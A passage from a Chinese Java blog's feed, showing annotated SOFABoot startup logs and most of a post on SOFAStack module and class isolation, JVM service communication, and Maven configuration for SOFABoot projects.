[SOFA-ARK-telnet-server-worker-0-T1] INFO io.netty.handler.logging.LoggingHandler - [id: 0xd2963d81, L:/0:0:0:0:0:0:0:0:1234] ACTIVE</span><br><span class="line"></span><br><span class="line">2021-04-15 20:34:40.233  INFO 10844 --- [           main] com.alipay.sofa                          : SOFABoot Runtime Starting!</span><br><span class="line"># ...</span><br><span class="line"># --&gt;由于当前模块中使用 @SofaReference 引用了服务 SampleJvmService, 因此扫描到此注解时，会根据注解的信息创建相应的代理对象</span><br><span class="line">2021-04-15 20:34:58.727  INFO 10844 --- [           main] com.alipay.sofa                          : Registering component: reference:com.alipay.sofa.isle.sample.SampleJvmService:#1173235289</span><br><span class="line"># 开始创建代理对象</span><br><span class="line">2021-04-15 20:34:58.731  INFO 10844 --- [           main] com.alipay.sofa                          :  &gt;&gt;In Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService.</span><br><span class="line">2021-04-15 20:34:58.759  INFO 10844 --- [           main] com.alipay.sofa                          :  &gt;&gt;In Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService.</span><br><span class="line"># &lt;--解析完一个 @SofaReference</span><br><span class="line">2021-04-15 20:34:58.760  INFO 10844 --- [           main] com.alipay.sofa                          : Registering component: reference:com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl#1173235289</span><br><span class="line">2021-04-15 20:34:58.761  INFO 10844 --- [           main] com.alipay.sofa                          :  &gt;&gt;In Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl.</span><br><span class="line">2021-04-15 20:34:58.761  INFO 10844 --- [           main] com.alipay.sofa                          :  &gt;&gt;In Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl.</span><br><span class="line">2021-04-15 20:34:58.761  INFO 10844 --- [           main] com.alipay.sofa                          : Registering component: reference:com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl#1173235289</span><br><span class="line">2021-04-15 20:34:58.761  INFO 10844 --- [           main] com.alipay.sofa                          :  &gt;&gt;In Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl.</span><br><span class="line">2021-04-15 20:34:58.762  INFO 10844 --- [           main] com.alipay.sofa                          :  &gt;&gt;In Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl.</span><br><span class="line"># ...</span><br><span class="line">2021-04-15 20:35:20.688  INFO 10844 --- [           main] com.alipay.sofa                          : ++++++++++++++++++ ModelCreatingStage of SqBiz Main Start +++++++++++++++++</span><br><span class="line">2021-04-15 20:35:20.717  INFO 10844 --- [           main] com.alipay.sofa                          : ++++++++++++++++++ ModelCreatingStage of SqBiz Main End +++++++++++++++++</span><br><span class="line">2021-04-15 20:35:20.717  INFO 10844 --- [           main] com.alipay.sofa                          : ++++++++++++++++++ SpringContextInstallStage of SqBiz Main Start +++++++++++++++++</span><br><span class="line">2021-04-15 20:35:20.720  INFO 10844 --- [           main] com.alipay.sofa                          : </span><br><span class="line">All activated module list(2) &gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">  ├─ cn.aezo.sqbiz.sqbiz-plugin.service-consumer</span><br><span class="line">  └─ cn.aezo.sqbiz.sqbiz-plugin.service-provider</span><br><span class="line"></span><br><span class="line">Modules that could install(2) &gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">  ├─ cn.aezo.sqbiz.sqbiz-plugin.service-provider</span><br><span class="line">  └─ cn.aezo.sqbiz.sqbiz-plugin.service-consumer</span><br><span class="line"></span><br><span class="line">2021-04-15 20:35:20.724  INFO 10844 --- [           main] com.alipay.sofa                          : Start install SqBiz Main&apos;s module: cn.aezo.sqbiz.sqbiz-plugin.service-provider</span><br><span class="line">2021-04-15 20:35:20 JRebel: Monitoring Spring bean definitions in &apos;D:\gitwork\oschina\sqbiz\sqbiz-parent\sqbiz-plugin\service-provider\target\classes\META-INF\spring\service-provide.xml&apos;.</span><br><span class="line">2021-04-15 20:35:21.717  INFO 10844 --- [           main] com.alipay.sofa                          : Start install SqBiz Main&apos;s module: cn.aezo.sqbiz.sqbiz-plugin.service-consumer</span><br><span class="line">2021-04-15 20:35:21 JRebel: Monitoring Spring bean definitions in &apos;D:\gitwork\oschina\sqbiz\sqbiz-parent\sqbiz-plugin\service-consumer\target\classes\META-INF\spring\service-consumer.xml&apos;.</span><br><span class="line">2021-04-15 20:40:08.094  INFO 10844 --- [ervice-provider] com.alipay.sofa                          : Begin refresh Spring Application Context of module cn.aezo.sqbiz.sqbiz-plugin.service-provider of application SqBiz Main.</span><br><span class="line">2021-04-15 20:41:36.672  INFO 10844 --- [ervice-provider] com.alipay.sofa                          : Registering component: service:com.alipay.sofa.isle.sample.SampleJvmService</span><br><span class="line">2021-04-15 20:41:36.673  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;PreOut Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService.</span><br><span class="line">2021-04-15 20:41:36.675  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;PreOut Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService.</span><br><span class="line">2021-04-15 20:43:22.438  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;Out Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService.</span><br><span class="line">2021-04-15 21:03:18.238  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;Out Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService.</span><br><span class="line">2021-04-15 21:03:55.586  INFO 10844 --- [ervice-provider] com.alipay.sofa                          : Register Service - com.alipay.sofa.isle.sample.SampleJvmService</span><br><span class="line">2021-04-15 21:05:16.719  INFO 10844 --- [ervice-provider] com.alipay.sofa                          : Registering component: service:com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl</span><br><span class="line">2021-04-15 21:05:16.719  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;PreOut Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl.</span><br><span class="line">2021-04-15 21:05:16.719  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;PreOut Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl.</span><br><span class="line">2021-04-15 21:05:29.506  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;Out Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl.</span><br><span class="line">2021-04-15 21:05:29.506  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;Out Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl.</span><br><span class="line">2021-04-15 21:05:29.506  INFO 10844 --- [ervice-provider] com.alipay.sofa                          : Register Service - com.alipay.sofa.isle.sample.SampleJvmService:serviceClientImpl</span><br><span class="line">2021-04-15 21:05:29.527  INFO 10844 --- [ervice-provider] com.alipay.sofa                          : Registering component: service:com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl</span><br><span class="line">2021-04-15 21:05:29.528  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;PreOut Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl.</span><br><span class="line">2021-04-15 21:05:29.528  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;PreOut Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl.</span><br><span class="line">2021-04-15 21:05:29.528  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;Out Binding [jvm] Begins - com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl.</span><br><span class="line">2021-04-15 21:05:29.528  INFO 10844 --- [ervice-provider] com.alipay.sofa                          :  &lt;&lt;Out Binding [jvm] Ends - com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl.</span><br><span class="line">2021-04-15 21:05:29.528  INFO 10844 --- [ervice-provider] com.alipay.sofa                          : Register Service - com.alipay.sofa.isle.sample.SampleJvmService:annotationImpl</span><br><span class="line">2021-04-15 21:07:37.682  INFO 10844 --- [ervice-provider] com.alipay.sofa                          : Registering component: Spring:cn.aezo.sqbiz.sqbiz-plugin.service-provider</span><br><span class="line"></span><br><span class="line">2021-04-15 21:17:32.013  INFO 10844 --- [ervice-consumer] com.alipay.sofa                          : Begin refresh Spring Application Context of module cn.aezo.sqbiz.sqbiz-plugin.service-consumer of application SqBiz Main.</span><br><span class="line">Hello, jvm service xml implementation.</span><br><span class="line">Hello, jvm service annotation implementation.</span><br><span class="line">Hello, jvm service service client implementation.</span><br><span class="line">2021-04-15 21:17:35.675  INFO 10844 --- [ervice-consumer] com.alipay.sofa                          : Registering component: Spring:cn.aezo.sqbiz.sqbiz-plugin.service-consumer</span><br><span class="line">2021-04-15 21:17:35.675  INFO 10844 --- [           main] com.alipay.sofa                          : ++++++++++++++++++ SpringContextInstallStage of SqBiz Main End +++++++++++++++++</span><br><span class="line">2021-04-15 21:17:35.676  INFO 10844 --- [           main] com.alipay.sofa                          : ++++++++++++++++++ ModuleLogOutputStage of SqBiz Main Start +++++++++++++++++</span><br><span class="line">2021-04-15 21:17:35.677  INFO 10844 --- [           main] com.alipay.sofa                          : </span><br><span class="line">Spring context initialize success module list(2) &gt;&gt;&gt;&gt;&gt;&gt;&gt; [totalTime = 1780555 ms, realTime = 2177614 ms]</span><br><span class="line">  ├─cn.aezo.sqbiz.sqbiz-plugin.service-provider [1776894 ms]</span><br><span class="line">  │   `---D:\gitwork\oschina\sqbiz\sqbiz-parent\sqbiz-plugin\service-provider\target\classes\META-INF\spring\service-provide.xml</span><br><span class="line">  └─cn.aezo.sqbiz.sqbiz-plugin.service-consumer [3661 ms]</span><br><span class="line">      `---D:\gitwork\oschina\sqbiz\sqbiz-parent\sqbiz-plugin\service-consumer\target\classes\META-INF\spring\service-consumer.xml</span><br><span class="line"></span><br><span class="line">Spring context initialize failed module list(0) &gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">Spring bean load time cost list(2) &gt;&gt;&gt;&gt;&gt;&gt;&gt; [totalTime = 1780555 ms, realTime = 2177614 ms]</span><br><span class="line">  ├─[Module] cn.aezo.sqbiz.sqbiz-plugin.service-provider [1776894 ms]</span><br><span class="line">  │   ├─com.alipay.sofa.runtime.spring.factory.ServiceFactoryBean (sampleJvmService)  [1420319ms]</span><br><span class="line">  │   ├─com.alipay.sofa.isle.sample.PublishServiceWithClient (publishServiceWithClient)  [12795ms]</span><br><span class="line">  │   ├─com.alipay.sofa.boot.autoconfigure.runtime.SofaRuntimeAutoConfiguration (runtimeContextBeanFactoryPostProcessor)  [529ms]</span><br><span class="line">  │   ├─org.springframework.boot.autoconfigure.jdbc.DataSourceInitializerPostProcessor (dataSourceInitializerPostProcessor)  [175ms]</span><br><span class="line">  │   ├─org.springframework.boot.actuate.autoconfigure.metrics.MetricsAutoConfiguration (meterRegistryPostProcessor)  [173ms]</span><br><span class="line">  │   ├─org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration (persistenceExceptionTranslationPostProcessor)  [154ms]</span><br><span class="line">  │   ├─com.alipay.sofa.boot.autoconfigure.runtime.SofaRuntimeAutoConfiguration (jvmFilterPostProcessor)  [122ms]</span><br><span class="line">  │   └─com.alipay.sofa.boot.autoconfigure.isle.SofaModuleAutoConfiguration (sofaModuleBeanFactoryPostProcessor)  [121ms]</span><br><span class="line">  └─[Module] cn.aezo.sqbiz.sqbiz-plugin.service-consumer [3661 ms]</span><br><span class="line">      └─com.alipay.sofa.isle.sample.JvmServiceConsumer (consumer)  [3364ms]</span><br><span class="line"></span><br><span class="line">2021-04-15 21:17:35.678  INFO 10844 --- [           main] com.alipay.sofa                          : ++++++++++++++++++ ModuleLogOutputStage of SqBiz Main End +++++++++++++++++</span><br><span class="line">Ark container started in 44129 ms.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;isle-sofa-boot模块隔离&quot;&gt;&lt;a href=&quot;#isle-sofa-boot模块隔离&quot; class=&quot;headerlink&quot; title=&quot;isle-sofa-boot模块隔离&quot;&gt;&lt;/a&gt;isle-sofa-boot模块隔离&lt;/h2&gt;&lt;h3 id=&quot;初
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
      <category term="src" scheme="http://blog.aezo.cn/tags/src/"/>
    
      <category term="springboot" scheme="http://blog.aezo.cn/tags/springboot/"/>
    
      <category term="微服务" scheme="http://blog.aezo.cn/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
      <category term="plugin" scheme="http://blog.aezo.cn/tags/plugin/"/>
    
  </entry>
  
  <entry>
    <title>SOFAStack</title>
    <link href="http://blog.aezo.cn/2021/04/11/java/sofastack/"/>
    <id>http://blog.aezo.cn/2021/04/11/java/sofastack/</id>
    <published>2021-04-11T04:40:00.000Z</published>
    <updated>2022-03-03T10:08:20.244Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><a href="https://www.sofastack.tech/" target="_blank" rel="noopener">官网</a>、<a href="https://tech.antfin.com/products/SOFA" target="_blank" rel="noopener">蚂蚁产品说明</a></li><li>SOFAStack技术栈<ul><li>包含SOFABoot、SOFAArk、SOFARPC等子项目</li><li>其中SOFABoot是基于Springboot开发，可和SOFAArk结合使用</li></ul></li><li>SOFABoot模块隔离<ul><li>maven模块隔离的基础上，增加对Spring 上下文隔离</li></ul></li><li>SOFAArk类隔离<ul><li>每个模块都有独立的 ClassLoader，消除不同类版本冲突问题</li></ul></li></ul><h2 id="Java模块化开发对比"><a href="#Java模块化开发对比" class="headerlink" title="Java模块化开发对比"></a>Java模块化开发对比</h2><ul><li>参考文章 <a href="https://www.sofastack.tech/projects/sofa-boot/modular-development/" target="_blank" rel="noopener">https://www.sofastack.tech/projects/sofa-boot/modular-development/</a><ul><li>基于代码组织上的模块化，如使用Maven<ul><li>这是最常见的形式，在开发期，将不同功能的代码放在不同 Java 工程下，在编译期被打进不同 jar 包，<strong>在运行期，所有 Java 类都在一个 classpath 下，没做任何隔离</strong></li></ul></li><li>基于 Spring 上下文隔离的模块化，SOFABoot使用此方式<ul><li>借用 Spring 上下文来做不同功能模块的隔离，在开发期和编译期，代码和配置也会分在不同 Java 工程中，但在运行期，<strong>不同模块间的 Spring Bean 相互不可见</strong></li><li><strong>但是所有的 Java 类还是在同一个 ClassLoader 下</strong></li></ul></li><li>类隔离，基于 ClassLoader 隔离的模块化，SOFAArk使用此方式<ul><li>借用 ClassLoader 来做隔离，<strong>每个模块都有独立的 ClassLoader，模块与模块之间的 classpath 不同</strong></li></ul></li></ul></li><li>对比 SOFABoot、OSGi、SOFAArk、Java9 模块化<ul><li><a href="https://www.sofastack.tech/blog/sofastack-modular-isolation/" target="_blank" rel="noopener">https://www.sofastack.tech/blog/sofastack-modular-isolation/</a></li><li><a href="https://www.sofastack.tech/projects/sofa-boot/faq/" target="_blank" rel="noopener">https://www.sofastack.tech/projects/sofa-boot/faq/</a></li><li>SOFABoot各模块基于Maven组织(通过导入class类实现class共用)，各模块Spring上下文隔离</li><li>SOFAArk各Biz/Plugin间class类隔离，Spring上下文也隔离</li></ul></li><li>SOFABoot<ul><li>基于 Spring 上下文隔离的模块化，主模块(web)需要组织其他模块依赖(<strong>即主模块的maven需要依赖其他模块</strong>)</li><li><strong>模块不支持Controller层</strong><ul><li>SOFABoot 模块一般用于封装对外发布服务接口的具体实现，属于业务层，Controller 属于展现层内容，官方不建议也不支持在 SOFABoot 模块中定义 Controller 组件，Controller 组件相关定义建议直接放在 Root Application Context</li></ul></li><li><strong>可使用SOFAArk达到类隔离的目的，且SOFAArk支持运行时动态发布模块服务(Ark Biz)</strong></li></ul></li><li>OSGI<ul><li>支持类隔离</li><li>支持动态模块化</li></ul></li><li>pf4j<ul><li>基于java特性SPI进行开发，参考<a href="/_posts/java/java-release.md#SPI">java-release.md#SPI</a></li><li>支持类隔离，基于 ClassLoader 隔离的模块化</li><li>支持动态模块化</li><li>Gitblit 项目使用的就是 PF4J 进行插件管理</li></ul></li><li><a href="/_posts/java/archive/springboot-plugin-framework.md">springboot-plugin-framework</a><ul><li>基于pf4j，且目标是整合springboot</li><li><strong>模块支持简单的Controller层</strong></li></ul></li><li>Java9 模块化<ul><li>基于 Jigsaw</li><li>不允许运行时动态发布模块服务</li><li>没有解决同一个类多版本的问题</li></ul></li></ul><h2 id="SOFA技术栈模块简介"><a href="#SOFA技术栈模块简介" class="headerlink" title="SOFA技术栈模块简介"></a>SOFA技术栈模块简介</h2><ul><li><code>isle-sofa-boot-starter</code> SOFABoot模块隔离</li><li><code>sofa-ark-springboot-starter</code> SOFAArk类隔离</li><li><code>sofa-ark-container</code> Ark容器</li><li><code>healthcheck-sofa-boot-starter</code> SOFABoot监控检测</li><li><code>runtime-sofa-boot-starter</code> SOFABoot 在 v2.6.0 开始提供异步初始化 Spring Bean 能力</li><li>插件<ul><li><code>runtime-sofa-boot-plugin</code> 用于提供 SOFA JVM 服务通信能力，参考<a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-ark-jvm/" target="_blank" rel="noopener">Ark 服务通信(Biz 之间的通信问题)</a></li><li><code>web-ark-plugin</code> 用于提供多 web 应用合并部署能力等</li></ul></li></ul><h2 id="通信-调用"><a href="#通信-调用" class="headerlink" title="通信/调用"></a>通信/调用</h2><ul><li>SofaBoot中各模块相互调用<ul><li>使用JVM服务通信<ul><li>支持以下实现方式<ul><li>XML 方式</li><li>Annotation 方式：可使用@SofaService/@SofaReference进行注入</li><li>编程 API 方式：基于 ServiceClient 和 ReferenceClient进行调用和声明<ul><li>方式1：实现 ClientFactoryAware 接口</li><li>方式2：基于 @SofaClientFactory 注解获取编程 API。参考：SqBiz下的<code>SqSofaServiceHelper.java</code></li><li>JVM服务通信说明参考下文</li><li>不同ArkBiz/Plugin下调用说明参考下文</li></ul></li></ul></li><li><strong>JVM服务通信注意点</strong><ul><li>整个通信在同一线程下，会找到加载对应服务/模块的ClassLoader(如ArkBiz的方式)，进行当前线程的ClassLoader切换(参考ServiceProxy)。由于切换了ClassLoader，尽管类名相同，对应的class对象可能是不同的(同一class的前提是由同一个类加载)，从而静态成员的数据也不能共享，如ThreadLocal无法在两个模块见共享的问题，解决方案如下<ul><li>可将相关类封装成Plugin，这样不同Biz直接的使用同一个类时，都是由同一Plugin类加载器加载的，因此静态成员数据即可共享</li><li>通过Root Application Context中转(未测试)</li><li>通过SOFABoot扩展点(未测试)</li></ul></li><li>传入参数和返回结果会被序列化<ul><li>数据传输都会被序列化(被调用中修改参数对象并不会反映到调用者传入的参数上)，被调用函数的全部结果需要通过返回值进行反映。参考：SqBiz下的<code>SofaAuthProviderDelegate.java</code></li></ul></li></ul></li><li><strong>不同ArkBiz/Plugin下调用</strong><ul><li>所有的@SofaService/@SofaReference/Extension等都是基于ComponentManager(实现类ComponentManagerImpl)在初始化时进行注册，且都是缓存在ComponentManagerImpl#registry集合中供调用时使用</li><li>由于ArkBiz/Plugin的类加载器不同，所以ComponentManagerImpl在各类加载器中对应不同类，从而ComponentManagerImpl#registry保存的数据也不是共享的，从而导致无法跨Ark调用</li><li>解决：参考：SqBiz下的<code>SqSofaServiceHelper.java</code>(跨模块可以通过uniqueId+ISqSofaService接口获取到对应服务，再通过SpringU反射调用服务)</li></ul></li></ul></li><li>基于RPC进行调用<ul><li>RPC基于TCP协议时(gRPC是基于HTTP2进行通信的)是建立的长链接，不需要像HTTP一样每次请求(HTTP为无状态)都进行TCP的三次握手，减少了网络开销</li></ul></li></ul></li><li>(SofaArk)Biz-Biz通信: 同 SofaBoot使用JVM服务通信<ul><li>参考 <a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-ark-jvm/" target="_blank" rel="noopener">https://www.sofastack.tech/projects/sofa-boot/sofa-ark-ark-jvm/</a></li><li><strong>目前仅sofa v3.1.4支持</strong>，sofa v3.2.2~v3.7.0报错</li></ul></li><li>(SofaArk)Biz-Plugin通信: 参考 <a href="https://www.sofastack.tech/projects/sofa-boot/sofa-ark-ark-service/" target="_blank" rel="noopener">https://www.sofastack.tech/projects/sofa-boot/sofa-ark-ark-service/</a><ul><li>PluginContext 中提供了发布服务和引用服务的接口</li><li>PluginActivator 插件只需要实现此接口，并在 MANIFEST.MF 中配置 activator 属性，就会在启动时执行 start 方法，停止时执行 stop 方法</li><li>@ArkInject</li></ul></li></ul><h2 id="SAFOBoot"><a href="#SAFOBoot" class="headerlink" title="SAFOBoot"></a>SAFOBoot</h2><ul><li>使用参考: <a href="https://github.com/sofastack-guides/sofa-boot-guides" target="_blank" rel="noopener">https://github.com/sofastack-guides/sofa-boot-guides</a></li></ul><h3 id="简单使用-不使用其模块隔离功能"><a href="#简单使用-不使用其模块隔离功能" class="headerlink" title="简单使用(不使用其模块隔离功能)"></a>简单使用(不使用其模块隔离功能)</h3><ul><li>依赖和打包</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 将springboot项目的parent换行sofaboot(内嵌springboot) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sofaboot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如果不使用SOFABoot的模块隔离，则只需要springboot打包插件即可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>如果需要使用高版本的sofaboot(当前最高v3.6.0)，需要增加snapshot仓库配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>default<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">id</span>&gt;</span>maven-snapshot<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://oss.sonatype.org/content/repositories/snapshots<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">id</span>&gt;</span>maven-snapshot<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://oss.sonatype.org/content/repositories/snapshots<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="模块化开发"><a href="#模块化开发" class="headerlink" title="模块化开发"></a>模块化开发</h3><ul><li>如果需要使用SOFABoot的模块化开发还需增加依赖</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 主模块需要加模块隔离依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>isle-sofa-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 可选，主模块中增加健康检查。启动后可访问 http://localhost:8088/actuator 查看信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>healthcheck-sofa-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 主模块中还需增加对其他模块的依赖（此处省略） --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 主模块中增加springboot-web、db等依赖（此处省略） --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子模块需要增加SOFA运行时依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>runtime-sofa-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>使用SOFABoot的模块化开发时，打包插件变更</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 主模块打包 